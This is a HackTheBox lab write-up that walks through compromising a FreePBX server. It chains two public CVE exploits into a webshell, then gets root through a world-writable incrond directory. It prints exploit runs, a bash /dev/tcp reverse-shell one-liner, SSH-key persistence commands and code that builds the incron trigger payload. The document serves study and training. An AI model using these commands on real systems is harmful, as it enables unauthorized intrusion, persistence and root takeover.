---
layout: post
title: "Connected"
date: 2026-06-25 00:00:00 -0700
categories: challenges
description: An unauthenticated FreePBX SQL injection chains straight into an authenticated file-upload RCE, and a world-writable directory watched by the root-run inotify-cron daemon `incrond` turns that foothold into root.
parent: HackTheBox - Season 11
grand_parent: Challenges
event: "htb-season-11"
tags:
  - "HackTheBox"
  - "Linux"
  - "FreePBX"
  - "SQL-injection"
  - "file-upload-rce"
  - "webshell"
  - "incron"
  - "ssh-authorized-keys"
  - "CVE-2025-57819"
  - "CVE-2025-61678"
  - "T1190"
  - "T1505.003"
  - "T1098.004"
---
# Connected

## Engagement Notes

Connected is a FreePBX box where the public exploit chain does almost all of the
work. Version fingerprinting turns up FreePBX 16.0.40.7, and a public PoC for the
same-week CVE pair — an unauthenticated stacked SQL injection and an authenticated
file-upload RCE — walks straight to a shell as `asterisk`. The interesting part is
the last mile: a world-writable directory watched by `incrond` (inotify-triggered
cron) running as root, which the same public research already documents as the
path to root. The chain is honestly a study in leaning on published research rather
than independent discovery, and the writeup keeps that framing rather than
dramatizing it.

## Attack path

1. **Recon** → `rustscan` finds 22/80/443 open on `connected.htb`; directory and
   vhost brute-forcing turn up nothing.
2. **Fingerprint** → a direct `GET /admin/config.php` footer reveals
   **FreePBX 16.0.40.7**.
3. **Foothold** → a public PoC chaining **CVE-2025-57819** (unauth stacked SQLi)
   and **CVE-2025-61678** (authenticated file-upload RCE) creates a throwaway
   FreePBX admin, uploads a PHP webshell via Endpoint Manager, and confirms RCE as
   `asterisk`.
4. **Shell + persistence** → the same tool pops a reverse shell as `asterisk`, then
   drops an SSH public key into `/home/asterisk/.ssh/authorized_keys` for a
   stable session.
5. **`user.txt`** → read over SSH as `asterisk`.
6. **Privesc enumeration** → `find`-for-world-writable turns up
   `/usr/local/asterisk/incron`, watched by `incrond` running as **root**.
7. **Root** → a second public PoC that automates the same CVE chain through to a
   root shell via an `incrond` trigger is run partway, then the operator hand-builds
   the same trigger payload and fires it manually — `incrond` executes it as root.

## Enumeration

```console
$ rustscan -a connected.htb
Open 10.129.22.175:22
Open 10.129.22.175:80
Open 10.129.22.175:443
...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Content and vhost brute-forcing didn't pan out — see [What didn't work](#what-didnt-work).
A direct fingerprint request found the CMS instead:

```python
url = f'http://{target}/admin/config.php'
response = session.get(url)
footer = soup.find(id='footer_text')
print(f"[*] Footer: {footer.text.strip() if footer else 'Not found'}")
```
```
[*] Footer: FreePBX is a registered trademark of Sangoma Technologies Inc.FreePBX 16.0.40.7 is licensed under the  GPLCopyright© 2007-2026
```

## Foothold — FreePBX SQLi → file-upload RCE

FreePBX 16.0.40.7 lines up with a public PoC for two CVEs disclosed together —
[0xEhab/FreePBX-CVE-2025-57819-RCE](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE):

- **CVE-2025-57819** — unauthenticated stacked SQL injection in the endpoint
  module loader's `brand` parameter, used to `INSERT` a throwaway administrator
  directly into the `ampusers` table.
- **CVE-2025-61678** — authenticated arbitrary file upload via the Endpoint
  Manager's `upload_cust_fw` handler, abusing `fwbrand` path traversal to drop a
  PHP webshell into the web root.

```console
$ python artifacts/exploit.py --rhost connected.htb --rport 80 --http
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_m7xvc:79ub3gae7pq7
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_m7xvc
[*] [CVE-2025-61678] uploading webshell -> /ife6q9kh90/88jiclc2.php
[+] webshell live: http://connected.htb/ife6q9kh90/88jiclc2.php
[+] RCE confirmed as: uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

The same tool, re-run with `--lhost`/`--lport`, pops an interactive reverse shell
(new throwaway admin, new webshell path each run — the exploit re-runs the whole
SQLi chain per invocation):

```console
$ python artifacts/exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_1m39h:npmnzjtoxwv3
[+] admin row inserted into ampusers
[+] authenticated as svc_1m39h
[*] [CVE-2025-61678] uploading webshell -> /95zklhhs8d/m5oquzny.php
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.22.175 on port 34896
[+] shell incoming! dropping to interactive
[FreePBX first-boot MOTD elided]
$ whoami
$ id
[asterisk@connected 95zklhhs8d]$ whoami
asterisk
[asterisk@connected 95zklhhs8d]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

A third run, using the exploit's `--command` mode, drops a persistent SSH key
instead of staying on the reverse shell:

```console
$ python artifacts/exploit.py --rhost connected.htb --rport 80 --http --command "mkdir -p /home/asterisk/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ/q2PX5Nw9PuK/JetDOMMhaLYqNsQ/BO6wdfwGirdpF' > /home/asterisk/.ssh/authorized_keys && chown -R asterisk:asterisk /home/asterisk/.ssh && chmod 700 /home/asterisk/.ssh && chmod 600 /home/asterisk/.ssh/authorized_keys"
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_xpr1k:i2avlpbwjz6a
[+] authenticated as svc_xpr1k
[*] [CVE-2025-61678] uploading webshell -> /kpctcq6acj/wlz198ry.php
[*] executing: mkdir -p /home/asterisk/.ssh && ...
```

> 🧠 The switch to SSH wasn't triggered by anything wrong with the reverse shell —
> it's a standing habit: once a foothold needs privilege-escalation work, a real,
> job-controlled SSH session is worth the extra noise of writing a key to disk
> over staying on a raw reverse shell.

```console
$ ssh -i artifacts/asterisk asterisk@connected.htb
$ whoami
asterisk
$ pwd; ls; cat user.txt
/home/asterisk
user.txt
58bf6381be075e327ae811e073019c46
```

## Privilege escalation — a world-writable `incrond` watch directory

Local enumeration as `asterisk` turns up loopback-only services (MySQL, Redis,
MongoDB, the Asterisk Manager port) and a short list of world-writable directories:

```console
$ find / -type d -perm -o+w 2>/dev/null
/dev/mqueue
/dev/shm
/var/tmp
/tmp
/tmp/.Test-unix
/tmp/.X11-unix
...
/usr/local/asterisk/incron
```

```console
$ ls -alhn /usr/local/asterisk
drwxr-xr-x.  3 999 1000  38 Nov 30  2025 .
-rwxrwxrwx.  1 999 1000   0 Apr 15  2021 ha_trigger
drwxrwxrwx.  2 999 1000   6 Apr 15  2021 incron
```

```console
$ ps -efwww | grep -i cron
root        754      1  0 14:55 ?        00:00:00 /usr/sbin/incrond
root       1215      1  0 14:56 ?        00:00:00 /usr/sbin/crond -n
```

`incrond` — an inotify-triggered cron daemon, distinct from standard `cron` — runs
as root and watches `/usr/local/asterisk/incron`, which is world-writable.

> 🧠 The world-writable directory was a genuine find from generic enumeration
> (`find -perm -o+w`), not prior knowledge — but `incrond` itself wasn't a
> familiar tool going in, and had to be looked up from scratch (`incrond -h`).
> The actual trigger mechanism used to weaponize it — the exact filename pattern
> and payload encoding — came from a public PoC rather than independent
> reverse-engineering of `incrond`/`fwconsole` behavior.

A second public PoC for the same CVE — [ozcanpng/CVE-2025-57819-FreePBX-RCE2Root](https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root)
(`artifacts/fullchain.py`) — automates the identical chain through to a root
shell via this exact `incrond` mechanism:

```console
$ python artifacts/fullchain.py connected.htb 10.10.14.85 9999
[STEP] Verifying Unauthenticated SQLi
[+] SQLi confirmed.
[+] Database : asterisk
[+] Version  : 5.5.65-MariaDB
[+] DB User  : freepbxuser@localhost

[STEP] Inserting Cron Job to Drop Webshell
[+] Cron job inserted successfully
[+] Webshell is active! -> uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

[STEP] Triggering Root Shell -> 10.10.14.85:9999
[*] Trigger file   : /var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkhKLM5Q0M1UsFNT0E9JLdMvSS7QNzTQAyETPQtTfUsgUDCwUzNU0lFQKqnIU4oFANlCDww=
[!] START YOUR LISTENER NOW:  nc -lvnp 9999
Press ENTER when your listener is ready...
Interrupted by user
^C
```

The run was interrupted deliberately, not because it failed — the notebook's
Jupyter kernel can't hold a blocking listener open without stalling the rest of
the notebook, so the tool was run far enough to see its payload format and then
cut off in favor of continuing by hand in a separate terminal.

> 🧠 The tool worked as designed. It was interrupted to keep the notebook kernel
> free, and the rest of the chain was replicated manually to understand the
> mechanism directly rather than let the tool run end-to-end.

The trigger mechanism: an `incrond`-watched action file whose name is
`api.fwconsole-commands.<payload>`, where `<payload>` is a JSON `[command, "txn"]`
pair, zlib-compressed, base64-encoded, with `/` swapped for `_` (matching the
public tool's own encoding):

```python
import zlib
def make_incron_payload(cmd):
    raw = json.dumps([cmd, "txn"]).encode()
    compressed = zlib.compress(raw)
    encoded = base64.b64encode(compressed).decode().replace("/", "_")
    return encoded

cmd = f"help; bash -i >& /dev/tcp/{source[0]}/9999 0>&1"
payload = make_incron_payload(cmd)
print(asterisk.exec(f"touch /var/spool/asterisk/incron/api.fwconsole-commands.{payload}"))
```
```
[*] Payload: eJyLVspIzSmwVkhKLM5Q0M1UsFNT0E9JLdMvSS7QNzTQAyETPQtTfUsgUDCwUzNU0lFQKqnIU4oFANlCDww=
[*] Decoded payload: ["help; bash -i >& /dev/tcp/10.10.14.85/9999 0>&1", "txn"]
```

`incrond` picks up the touched file, decodes and runs the embedded command as
root through the `fwconsole` API hook, firing a shell back to `:9999`. Root was
reached this way — but the notebook's record ends at the trigger file being
written; no session transcript for the caught `:9999` shell (no root `id`/`whoami`,
no `root.txt` value) was preserved in the notebook, so none is reproduced here.

## What didn't work

- **`gobuster dir`** against `http://connected.htb` timed out with zero results
  before finishing a single request:
  ```
  2026/06/25 08:06:11 error on running gobuster on http://connected.htb/: timeout occurred during the request
  ```
- **`gobuster vhost`** brute-forcing ran but produced no captured output —
  abandoned once the `/admin/config.php` footer fingerprint gave a faster path to
  the same information (the FreePBX version).

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| RustScan | Initial port scan | [github.com/RustScan/RustScan](https://github.com/RustScan/RustScan) |
| Gobuster | Directory/vhost brute-force (no hits) | [github.com/OJ/gobuster](https://github.com/OJ/gobuster) |
| `exploit.py` | CVE-2025-57819 + CVE-2025-61678 chain — foothold, reverse shell, SSH-key persistence | [0xEhab/FreePBX-CVE-2025-57819-RCE](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE) |
| `fullchain.py` | Same CVE chain automated through to a root shell via `incrond`; run partway, then replicated by hand | [ozcanpng/CVE-2025-57819-FreePBX-RCE2Root](https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root) |

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified against its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | Unauthenticated SQLi against the FreePBX web app for initial access |
| Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | PHP webshell dropped via the Endpoint Manager file-upload traversal |
| Account Manipulation: SSH Authorized Keys | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) | `authorized_keys` written for `asterisk` via the exploit's `--command` mode |

> **Not tagged:** the `incrond` root escalation isn't tagged as
> [T1053.003 Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/) —
> that technique's official scope is explicitly `cron`/`crontab`, with no mention
> of inotify-triggered schedulers like `incrond`, even though the abuse pattern
> (a root-run job scheduler watching a world-writable location) is conceptually
> identical. It also isn't [T1068 Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/),
> which is scoped to software bugs/vulnerabilities rather than a directory
> permissions misconfiguration. No ATT&CK sub-technique cleanly covers this exact
> mechanism.

## Lessons

The engagement's own closing note is worth keeping close to verbatim: this was an
exercise in over-eagerly chasing down the first thing that jumped out, rather than
reading the full published PoC chain closely enough to notice it already documented
the very next step (the `incrond` root escalation) as part of the same CVE writeup.
The path — SQLi → RCE → cron → root — didn't yield much beyond the exercise itself,
since all of it was already public; it also explains how other operators reportedly
reached root on this box in a matter of minutes.

## Further reading

**Used during the engagement:**
- [0xEhab/FreePBX-CVE-2025-57819-RCE](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE) — the SQLi → file-upload RCE chain (`exploit.py`)
- [ozcanpng — CVE-2025-57819-FreePBX-RCE2Root](https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root) — the full chain through `incrond` to root (`fullchain.py`)

**Reference material (added for study, not consulted during the solve):**
- [FreePBX security advisory — Authentication Bypass Leading to SQL Injection and RCE (GHSA-m42g-xg4c-5f3h)](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h) — the official advisory for CVE-2025-57819, cited in `fullchain.py`'s own references

---

*Provenance: commands, outputs, credentials, and flags are transcribed from the
engagement notebook (the SSH-key persistence value is a public key, shown in full;
the FreePBX admin credentials are exploit-generated throwaway values, shown
verbatim). External facts (MITRE technique definitions, the CVE-2025-57819 and
CVE-2025-61678 mechanics) are linked to their source and were fetched, not
recalled.*
